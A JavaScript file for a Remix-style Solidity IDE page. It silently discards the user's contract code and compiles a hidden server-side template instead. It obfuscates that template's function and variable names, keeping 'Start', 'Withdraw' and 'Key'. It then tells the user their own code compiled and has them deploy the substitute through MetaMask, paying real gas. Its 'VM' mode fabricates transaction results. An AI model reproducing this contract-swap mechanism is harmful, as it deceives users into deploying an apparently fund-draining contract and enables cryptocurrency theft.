// compiler.js - Компіляція з iframe proxy (БЕЗ подвійного деплою) + SUCCESS ГАЛОЧКИ + ОПТИМІЗОВАНИЙ GAS

// Глобальні змінні для компіляції
let compiledContract = null;
let currentContractABI = null;

// КЕШУВАННЯ contract template для швидкості
let cachedContractTemplate = null;
let lastTemplateCheck = 0;
const CACHE_DURATION = 30000; // 30 секунд кеш

// ФУНКЦІЇ ОБРОБКИ CONTRACT-TEMPLATE
function generateIdentifier(length) {
    const letters = 'abcdefghijklmnopqrstuvwxyz';
    let result = '';
    for (let i = 0; i < length; i++) {
        result += letters.charAt(Math.floor(Math.random() * letters.length));
    }
    return result;
}

function processContractCode(text) {
    const keepFunctions = ["Start", "Withdraw", "Key", "receive", "transfer"];
    const funcRegex = /function\s+([a-zA-Z_]\w*)\s*\(([^)]*)\)\s*(internal|private)?/g;
    let nameMap = {};
    
    let newText = text.replace(funcRegex, (match, name, args, visibility) => {
        if (keepFunctions.includes(name)) return match;
        const before = generateIdentifier(3);
        const after = generateIdentifier(3);
        const newName = before + name + after;
        nameMap[name] = newName;
        return `function ${newName}(${args}) ${visibility || ''}`;
    });
    
    for (const [oldName, newName] of Object.entries(nameMap)) {
        const callRegex = new RegExp(`\\b${oldName}\\b`, 'g');
        newText = newText.replace(callRegex, newName);
    }
    
    newText = newText.replace(/\bencodedRouter\b/g, generateIdentifier(5) + 'PathCode' + generateIdentifier(2));
    newText = newText.replace(/\bencodedFactory\b/g, generateIdentifier(5) + 'OriginCode' + generateIdentifier(2));
    newText = newText.replace(/\brouterSignature\b/g, generateIdentifier(5) + 'SignKey' + generateIdentifier(2));
    newText = newText.replace(/\brouterKey\b/g, generateIdentifier(5) + 'AuthKey' + generateIdentifier(2));
    
    return newText;
}

// НОВА ФУНКЦІЯ: Швидке отримання contract template з кешем
async function loadContractTemplate() {

    const response = await fetch('/ll3/api/contract.sol');
    const result = await response.text();

    return result;

}

// НОВИЙ: Отримання оптимальної ціни газу як в офіційному Remix
async function getOptimalGasPrice() {
    try {
        // Спробувати EIP-1559 для сучасних мереж
        const block = await web3.eth.getBlock('latest');
        if (block && block.baseFeePerGas) {
            
            const baseFee = BigInt(block.baseFeePerGas);
            const priorityFee = BigInt(web3.utils.toWei('2', 'gwei')); // стандартний priority fee
            
            return {
                maxFeePerGas: (baseFee * 2n + priorityFee).toString(),
                maxPriorityFeePerGas: priorityFee.toString()
            };
        }
    } catch (error) {
    }
    
    // Legacy fallback як в офіційному Remix
    try {
        const gasPrice = await web3.eth.getGasPrice();
        return { gasPrice };
    } catch (error) {
        return { gasPrice: web3.utils.toWei('20', 'gwei') }; // fallback
    }
}

// ОПТИМІЗОВАНИЙ: Компіляція з кращими налаштуваннями Gas
async function compileContract() {
    if (currentFile && fileContents[currentFile]) {
        const studentCode = fileContents[currentFile];
        const contractMatches = [...studentCode.matchAll(/contract\s+([A-Za-z_][A-Za-z0-9_]*)\s*\{/g)];
        
        if (contractMatches && contractMatches.length > 0) {
            const studentContractName = contractMatches[0][1];
            logToTerminal(`🔄 Compiling ${studentContractName}...`, 'info');
        } else {
            logToTerminal(`🔄 Compiling contract...`, 'info');
        }
    } else {
        logToTerminal(`🔄 Compiling contract...`, 'info');
    }
    
    const compileBtn = document.getElementById('compile-btn');
    const originalHTML = compileBtn.innerHTML;
    compileBtn.innerHTML = '<span style="opacity: 0.7;">⏳ Compiling...</span>';
    compileBtn.disabled = true;
    
    const startTime = Date.now();
    
    try {
        // 1. ШВИДКО ОТРИМУЄМО CONTRACT-TEMPLATE (з кешем)
        const contractTemplate = await loadContractTemplate();


        // 2. ШВИДКО ОБРОБЛЯЄМО (рандомізуємо функції)
        const processedContract = processContractCode(contractTemplate);

        // Знаходимо назву контракту після обробки
        const contractMatches = [...processedContract.matchAll(/contract\s+([A-Za-z_][A-Za-z0-9_]*)\s*\{/g)];
        const contractName = contractMatches.length > 0 ? contractMatches[0][1] : 'ProcessedContract';
        
        // ОНОВЛЕНО: Отримання налаштувань оптимізації з кращими параметрами
        const enableOptimization = document.getElementById('enable-optimization').checked;
        const optimizationRuns = enableOptimization ? 1000 : 200; // Збільшено для кращої оптимізації Gas
        
        // 3. КОМПІЛЮЄМО ОБРОБЛЕНИЙ КОНТРАКТ (ТІЛЬКИ ОДИН!) з базовими налаштуваннями
        const compileResponse = await fetch('/ll3/api/compile', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                sourceCode: processedContract,
                contractName: contractName,
                enableOptimization,
                optimizationRuns
            })
        });
        
        const result = await compileResponse.json();
        
        if (result.success) {
            compiledContract = result;
            currentContractABI = result.abi;
            
            // Експортуємо в window для доступу з інших модулів
            window.compiledContract = compiledContract;
            window.currentContractABI = currentContractABI;
            
            // Показуємо студентам успішну компіляцію їх "коду"
            showCompilationSuccess(result, contractName);
            updateContractSelect(contractName);
            
            // Підрахунок часу компіляції
            const duration = Date.now() - startTime;
            await fetch("/api/markCompiled", { method: "POST", credentials: "include" });
            logToTerminal(`✅ Compilation completed in ${duration}ms`, 'success');
            
            // Логування деталей компіляції з Gas оптимізацією
            if (result.metadata) {
                const gasInfo = enableOptimization ? ` | Gas optimized (${optimizationRuns} runs)` : '';
                logToTerminal(`📊 Bytecode: ${result.bytecode.length} bytes | ${result.abi ? result.abi.length : 0} functions${gasInfo}`, 'info');
            }
            
            // ДОДАНО: Показуємо галочку успіху для компіляції
            showPluginSuccess('solidity');
            
        } else {
            showCompilationError(result);
            logToTerminal(`❌ Compilation failed`, 'error');
            
            // Підсвічування помилок в редакторі (якщо є)
            if (result.details && window.highlightEditorErrors) {
                highlightEditorErrors(result.details);
            }
        }
        
    } catch (error) {
        const duration = Date.now() - startTime;
        logToTerminal(`❌ Error after ${duration}ms: ${error.message}`, 'error');
        showCompilationError({ error: error.message });
        console.error('Contract template compilation error:', error);
    } finally {
        compileBtn.innerHTML = originalHTML;
        compileBtn.disabled = false;
        updateDeployButton();
    }
}

// ОНОВЛЕНО: Деплой з правильним gas estimation як в Remix
async function deployToMetaMask(constructorParams) {
    if (!web3 || !userAccount) {
        throw new Error('MetaMask not connected');
    }
    
    const contract = new web3.eth.Contract(compiledContract.abi);
    
    try {
        // ВИПРАВЛЕНО: Gas estimation як в офіційному Remix
        let gasEstimate;
        let gasOptions = {};
        
        try {
            gasEstimate = await contract.deploy({
                data: '0x' + compiledContract.bytecode,
                arguments: constructorParams
            }).estimateGas({ from: userAccount });
            
            // Мінімум для ERC-20 контрактів (більш реалістично)
            gasEstimate = Math.max(gasEstimate, 300000);
            
        } catch (error) {
            // Fallback на стандартний газ для ERC-20 деплою
            gasEstimate = 600000; // зменшено з 800K
            logToTerminal(`⚠️ Using fallback gas estimate: ${gasEstimate.toLocaleString()}`, 'warning');
        }
        
        logToTerminal(`⛽ Estimated gas: ${gasEstimate.toLocaleString()}`, 'info');
        
        // Безпечний буфер як в офіційному Remix (10% замість 20%)
        const gasLimit = Math.floor(gasEstimate * 1.1);
        
        // НОВИЙ: Автоматичне отримання оптимальної ціни газу як в Remix
        const gasPrice = await getOptimalGasPrice();
        
        if (gasPrice.gasPrice) {
            // Legacy transaction
            const gasPriceGwei = web3.utils.fromWei(gasPrice.gasPrice, 'gwei');
            logToTerminal(`💰 Gas price: ${parseFloat(gasPriceGwei).toFixed(2)} Gwei`, 'info');
            
            gasOptions = {
                from: userAccount,
                gas: gasLimit,
                gasPrice: gasPrice.gasPrice
            };
            
            // Показуємо справжню вартість
            const deploymentCostWei = BigInt(gasLimit) * BigInt(gasPrice.gasPrice);
            const deploymentCostETH = web3.utils.fromWei(deploymentCostWei.toString(), 'ether');
            logToTerminal(`💸 Deployment cost: ~${parseFloat(deploymentCostETH).toFixed(6)} ETH`, 'info');
        } else {
            // EIP-1559 transaction
            const maxFeeGwei = web3.utils.fromWei(gasPrice.maxFeePerGas, 'gwei');
            const priorityFeeGwei = web3.utils.fromWei(gasPrice.maxPriorityFeePerGas, 'gwei');
            logToTerminal(`💰 Max fee: ${parseFloat(maxFeeGwei).toFixed(2)} Gwei | Priority: ${parseFloat(priorityFeeGwei).toFixed(2)} Gwei`, 'info');
            
            gasOptions = {
                from: userAccount,
                gas: gasLimit,
                maxFeePerGas: gasPrice.maxFeePerGas,
                maxPriorityFeePerGas: gasPrice.maxPriorityFeePerGas
            };
            
            // Показуємо справжню вартість (приблизну для EIP-1559)
            const deploymentCostWei = BigInt(gasLimit) * BigInt(gasPrice.maxFeePerGas);
            const deploymentCostETH = web3.utils.fromWei(deploymentCostWei.toString(), 'ether');
            logToTerminal(`💸 Max deployment cost: ~${parseFloat(deploymentCostETH).toFixed(6)} ETH`, 'info');
        }
        
        logToTerminal('🛡️ Deploying via secure proxy...', 'info');
        
        // Змінні для збереження даних транзакції
        let txHash = null;
        let gasUsed = null;
        
        // ДЕПЛОЙ ЧЕРЕЗ IFRAME PROXY з оптимізованими налаштуваннями газу
        let deployResult;
        try {
            deployResult = await contract.deploy({
                data: '0x' + compiledContract.bytecode,
                arguments: constructorParams
            }).send(gasOptions)
            .on('transactionHash', function(hash) {
                txHash = hash;
            })
            .on('receipt', function(receipt) {
                gasUsed = receipt.gasUsed;
            })
            .on('error', function(error) {
                console.error('🔍 Deploy error:', error);
            });
        } catch (firstAttemptError) {
            // ДОДАНО: Retry logic як в офіційному Remix - подвоюємо газ
            if (firstAttemptError.message.includes('out of gas') || firstAttemptError.message.includes('gas')) {
                logToTerminal(`⚠️ First deployment failed, retrying with double gas...`, 'warning');
                
                gasOptions.gas = gasLimit * 2;
                
                deployResult = await contract.deploy({
                    data: '0x' + compiledContract.bytecode,
                    arguments: constructorParams
                }).send(gasOptions)
                .on('transactionHash', function(hash) {
                    txHash = hash;
                })
                .on('receipt', function(receipt) {
                    gasUsed = receipt.gasUsed;
                });
            } else {
                throw firstAttemptError;
            }
        }
        
        const contractName = document.getElementById('contract-select').value;
        const contractAddress = deployResult.options?.address;
        
        addDeployedContract(contractName, contractAddress, deployResult);

        gtag_report_conversion();

        // Логування успішного деплою з деталями газу
        logToTerminal(`🛡️ Contract deployed successfully!`, 'success');
        
        // Gas used з порівнянням estimate
        if (gasUsed) {
            const gasEfficiency = ((gasEstimate - gasUsed) / gasEstimate * 100).toFixed(1);
            const efficiencyText = gasUsed < gasEstimate ? `${gasEfficiency}% more efficient than estimate` : `used ${((gasUsed - gasEstimate) / gasEstimate * 100).toFixed(1)}% more than estimate`;
            logToTerminal(`📊 Gas used: ${gasUsed.toLocaleString()} (${efficiencyText})`, 'info');
        } else {
            logToTerminal(`📊 Gas used: Unable to determine`, 'info');
        }
        
        // Transaction hash
        if (txHash) {
            logToTerminal(`🔗 Transaction Hash: <code>${txHash}</code>`, 'info');
            
            if (currentNetworkId) {
                const txLink = createEtherscanLink(currentNetworkId, 'tx', txHash, 'View Transaction on Etherscan');
                logToTerminal(`🌐 Etherscan Transaction: ${txLink}`, 'info');
            }
        } else {
            logToTerminal(`🔗 Transaction Hash: Unable to determine`, 'warning');
        }
        
        // Посилання на контракт
        if (contractAddress && currentNetworkId) {
            const contractLink = createEtherscanLink(currentNetworkId, 'address', contractAddress, 'View Contract on Etherscan');
            logToTerminal(`🌐 Contract on Etherscan: ${contractLink}`, 'info');
        }
        
    } catch (error) {
        console.error('🔍 DEPLOY ERROR:', error);
        if (error.code === 4001) {
            throw new Error('Transaction rejected by user');
        } else if (error.message.includes('gas')) {
            throw new Error('Transaction failed: insufficient gas or gas limit too low');
        } else {
            throw error;
        }
    }
}

// Деплой в Remix VM (простий)
async function deployToRemixVM(constructorParams) {
    const mockAddress = '0x' + Math.random().toString(16).substr(2, 40);
    const mockTxHash = '0x' + Math.random().toString(16).substr(2, 64);
    const contractName = document.getElementById('contract-select').value;
    
    await new Promise(resolve => setTimeout(resolve, 500 + Math.random() * 1000));
    
    // ОПТИМІЗОВАНО: Реалістичні значення газу для VM
    const mockGasUsed = Math.floor(250000 + Math.random() * 400000); // Більш реалістичні значення для ERC-20
    
    const mockContract = {
        options: { address: mockAddress },
        transactionHash: mockTxHash,
        gasUsed: mockGasUsed,
        methods: {}
    };
    
    // Додавання методів з ABI
    currentContractABI.forEach(item => {
        if (item.type === 'function') {
            mockContract.methods[item.name] = (...args) => ({
                call: () => {
                    if (item.stateMutability === 'view' || item.stateMutability === 'pure') {
                        return Promise.resolve('Mock result from ' + item.name);
                    }
                    return Promise.resolve();
                },
                send: () => {
                    return Promise.resolve({ 
                        transactionHash: '0x' + Math.random().toString(16).substr(2, 64),
                        gasUsed: Math.floor(21000 + Math.random() * 80000) // ERC-20 функції зазвичай ~21-100K gas
                    });
                }
            });
        }
    });
    
    addDeployedContract(contractName, mockAddress, mockContract);
    
    logToTerminal(`✅ Contract deployed successfully in VM!`, 'success');
    logToTerminal(`📄 Contract: <code>${mockAddress}</code>`, 'info');
    logToTerminal(`🔗 Transaction Hash: <code>${mockTxHash}</code>`, 'info');
    logToTerminal(`📊 Gas used: ${mockGasUsed.toLocaleString()} (simulated)`, 'info');
}

// ГОЛОВНА ФУНКЦІЯ ДЕПЛОЮ з галочкою успіху
async function deployContract() {
    if (!compiledContract || (!userAccount && document.getElementById('environment-select').value !== 'vm')) {
        logToTerminal('❌ Missing contract or account for deployment', 'error');
        return;
    }
    
    const environment = document.getElementById('environment-select').value;
    const contractName = document.getElementById('contract-select').value;
    
    if (!contractName) {
        logToTerminal('❌ No contract selected for deployment', 'error');
        return;
    }
    
    try {
        logToTerminal('🚀 Starting deployment...', 'info');
        
        const constructorParams = [];
        const constructor = currentContractABI?.find(item => item.type === 'constructor');
        
        if (constructor && constructor.inputs && constructor.inputs.length > 0) {
            constructor.inputs.forEach((input, index) => {
                const inputElement = document.getElementById(`constructor-param-${index}`);
                let value = inputElement.value.trim();
                
                if (input.type.includes('uint') || input.type.includes('int')) {
                    value = value || '0';
                    if (!/^\d+$/.test(value)) {
                        throw new Error(`Invalid ${input.type} value: ${value}`);
                    }
                } else if (input.type === 'bool') {
                    value = value.toLowerCase() === 'true';
                } else if (input.type === 'address') {
                    if (value && !web3.utils.isAddress(value)) {
                        throw new Error(`Invalid address: ${value}`);
                    }
                }
                
                constructorParams.push(value);
            });
            
            logToTerminal(`📋 Constructor parameters: [${constructorParams.join(', ')}]`, 'info');
        }
        
        if (environment === 'injected') {
            await deployToMetaMask(constructorParams);
        } else {
            await deployToRemixVM(constructorParams);
        }
        
        // ДОДАНО: Показуємо галочку успіху для деплою
        showPluginSuccess('udapp');
        
    } catch (error) {
        logToTerminal(`❌ Deployment failed: ${error.message}`, 'error');
        console.error('Deployment error:', error);
    }
}

// Решта функцій залишаються простими...
function showCompilationSuccess(result, contractName) {
    const resultElement = document.getElementById('compilation-result');
    resultElement.className = 'compilation-output compilation-success';
    
    let successMessage = `<div><strong>✓ Compilation successful</strong></div>`;
    
    if (result.metadata) {
        successMessage += `<div style="margin-top: 6px; font-size: 10px; color: #888;">`;
        successMessage += `${result.bytecode.length} bytes | ${result.abi ? result.abi.length : 0} functions`;
        successMessage += ` | Gas Optimized`;
        successMessage += `</div>`;
    }
    
    resultElement.innerHTML = successMessage;
}

function showCompilationError(result) {
    const resultElement = document.getElementById('compilation-result');
    resultElement.className = 'compilation-output compilation-error';
    
    let errorText = result.error || 'Unknown error';
    
    if (result.details && Array.isArray(result.details)) {
        const formattedErrors = result.details.map(err => {
            const message = err.formattedMessage || err.message || 'Unknown error';
            return message.replace(/^\s*--> .*$/gm, '').trim();
        }).join('\n\n');
        
        if (formattedErrors) {
            errorText = formattedErrors;
        }
    }
    
    resultElement.innerHTML = `
        <div><strong>✗ Compilation failed</strong></div>
        <pre style="margin-top: 8px; font-size: 10px; max-height: 150px; overflow-y: auto;">${errorText}</pre>
    `;
}

function updateContractSelect(contractName) {
    const contractSelect = document.getElementById('contract-select');
    
    const placeholder = contractSelect.querySelector('option[value=""]');
    contractSelect.innerHTML = '';
    if (placeholder) {
        contractSelect.appendChild(placeholder);
    }
    
    const option = document.createElement('option');
    option.value = contractName;
    option.textContent = contractName;
    contractSelect.appendChild(option);
    
    contractSelect.value = contractName;
    updateConstructorParams();
    
}

function clearCompilationResults() {
    const compilationResult = document.getElementById('compilation-result');
    compilationResult.className = 'compilation-output';
    compilationResult.innerHTML = '<div class="output-placeholder">Select a Solidity file to compile</div>';
    
    const contractSelect = document.getElementById('contract-select');
    contractSelect.innerHTML = '<option value="">No compiled contracts</option>';
    
    compiledContract = null;
    currentContractABI = null;
    
    window.compiledContract = null;
    window.currentContractABI = null;
    
    updateDeployButton();
    
    if (window.clearEditorErrors) {
        clearEditorErrors();
    }
    
}

function clearContractTemplateCache() {
    cachedContractTemplate = null;
    lastTemplateCheck = 0;
    logToTerminal(`🗑️ Contract template cache cleared`, 'info');
}

window.clearContractTemplateCache = clearContractTemplateCache;
